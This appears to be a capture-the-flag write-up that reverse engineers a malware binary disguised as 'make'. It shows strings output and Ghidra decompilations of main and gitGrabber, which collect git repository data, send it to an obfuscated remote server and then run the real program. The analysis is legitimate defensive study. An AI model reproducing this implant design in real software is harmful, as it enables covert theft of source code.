Now that we know where the malware is we need to understand what it is doing. We can see that we need the IP, port, and pub key of the malware so this let's us deduce several things. First and formost, this peice of malware is communicatinting to a remote server. This is very normal when malware is part of a bot net (unlikely due to the senerio) or a implant for an APT style attack communicating to a command and control server (C2) which is more likely in this case.

We also already know that this is not a stripped binary which will make it easier to reverse engineer which is very nice.

Taking a closer look at the file we see that it is:
```
$file make
make: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-x86_64.so.1, with debug_info, not stripped
```

It is incredibly nice that debugging information was included as well as that will help work with this.

The first step for me of analizing a binary is always running the strings command on it. This prints out all ascii characters in the binary and can give you an idea of what the binary does based on the function names and imports.

However, a there's a god awful number of strings in the binary file so it is impossible to look at all of them. (A total of `$strings make | wc -l 35855`). The impoported functions are normally at the top of the strings in a binary file so I looked at with `strings make | less`. This didn't give me too much interesting information. I did find several git function importas and socket imported:

```
...
memcmp
socket
memchr
pthread_mutex_unlock
strcmp
ntohl
__deregister_frame_info
git_diff_commit_as_email
git_revwalk_free
git_repository_open_ext
git_libgit2_init
git_revwalk_push_head
git_oid_tostr_s
git_revwalk_new
git_commit_author
git_commit_free
git_revwalk_sorting
git_repository_open
git_commit_summary
git_commit_lookup
git_libgit2_shutdown
git_revwalk_next
git_buf_dispose
git_repository_free
...
```

From this I can guess that something is being done witht the github repo and my suspision that the malware reaches out to a remote server is suppupported. From the previous challenge discription we know that this company has had problems with their source code being stolen before and all of these clues point to that.

At this point, I moved into more advanced static analisis of the binary using Gidrah because that seemed fiting due to the fact this is an NSA challenge. However tools like IDA, radare2, or binary ninja all would have worked as well. 

As always, when analizing a program let's start at main if we know where that is. It's a pretty short setup so I can included it all here:

```C
int main(int argc,char **argv)

{
  int iVar1;
  char *pcVar2;
  
  gitGrabber();
  pcVar2 = tgexpgbgxulli(0xe);
  *argv = pcVar2;
  iVar1 = execvp(*argv,argv);
  return iVar1;
}
```

We see that this main function calls a function called gitGrabber, then get's some arguments from tgexpgbgxulli that then calls some other program using execvp. This gives us 2 directions to work in. We can either explore the  tgexpgbgxulli function or the gitGrabber. While I did originally look at tgexpgbgxulli, when working on this progect it is hard to understand without looking at gitGrabber. (I'll also note that gitGrabber is human readable which may be a nudge by the compition creators that we should look there first. A nudge I missed at first, but see now with hindsight.)

Opening gitGraber we see a more substantial function:
```C
void gitGrabber(void)

{
  long lVar1;
  bool bVar2;
  int __fd;
  int iVar3;
  char *pcVar4;
  char *ip_00;
  size_t length;
  long in_FS_OFFSET;
  int successful;
  int lockfd;
  int rv;
  char *output;
  char *ip;
  char *lockfile;
  string tmp;
  basic_string local_1c8 [32];
  stringstream ss;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  bVar2 = false;
  std::__cxx11::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::
  basic_stringstream();
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string();
                    /* try { // try from 0010a283 to 0010a3e5 has its CatchHandler @ 0010a416 */
  git_libgit2_init();
  __fd = qyvqmmhtjmlie();
  if (((__fd != -1) && (iVar3 = ndldgaiugwdhv(), iVar3 == 0)) &&
     (iVar3 = dxfivqvkpuunm(&ss), iVar3 == 0)) {
    std::__cxx11::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::str();
    std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=
              ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&tmp,local_1c8);
    std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
              ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)local_1c8);
    pcVar4 = (char *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::
                     c_str();
    ip_00 = tgexpgbgxulli(0x13);
    length = std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::length();
    iVar3 = kvhlfowzlznog(ip_00,0x1a0a,pcVar4,length);
    aotxxfxjjvuoy(0x13);
    if (iVar3 == 0) {
      bVar2 = true;
    }
  }
  git_libgit2_shutdown();
  if ((__fd != -1) && (close(__fd), !bVar2)) {
    pcVar4 = tgexpgbgxulli(6);
    unlink(pcVar4);
    aotxxfxjjvuoy(6);
  }
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&tmp);
  std::__cxx11::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::
  ~basic_stringstream((basic_stringstream<char,std::char_traits<char>,std::allocator<char>> *)&ss);
  if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```


